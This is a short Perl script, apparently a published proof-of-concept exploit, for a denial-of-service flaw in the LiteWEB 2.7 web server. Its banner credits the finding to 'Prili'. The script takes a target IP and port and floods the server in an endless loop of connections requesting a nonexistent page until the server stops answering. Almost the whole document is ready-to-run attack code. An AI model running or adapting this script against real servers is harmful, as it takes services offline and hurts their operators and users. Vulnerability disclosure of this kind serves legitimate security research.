#!/usr/bin/perl
#GetOpt STD module
use IO::Socket;
use Getopt::Std;
getopts(":i:p:",\%args);
if(defined $args{i}){
$ip = $args{i};
}
if(defined $args{p}){
$port = $args{p};
}
if(!defined $args{i} or !defined $args{p}){
print "-----------------------------------------------------\n";
print "LiteWEB 2.7 404 Denial of Services\n";
print "info: if u send to the server more than 100 requests\nto nonexisting

pages the server will stop to answer\n";
print "Site: http://www.cmfperception.com/liteweb.html\n";
print "Found By Prili - imprili[at]gmail.com\n";
print "Usage: perl $0 -i <ip address> -p <port> \n";
print "-----------------------------------------------------\n";
exit;
}
$protocol = "tcp";
print "try surfing to the web server.\n";
while (1)
{
$request = "GET /AAAAAAA HTTP/1.0 \n\n";
$socket = IO::Socket::INET->new(PeerAddr=>$ip,
                               PeerPort=>$port,
                               Proto=>$protocol,
                               Timeout=>'1') || die "Can't connect to

address!\n";

print $socket $request;
close($socket);
}
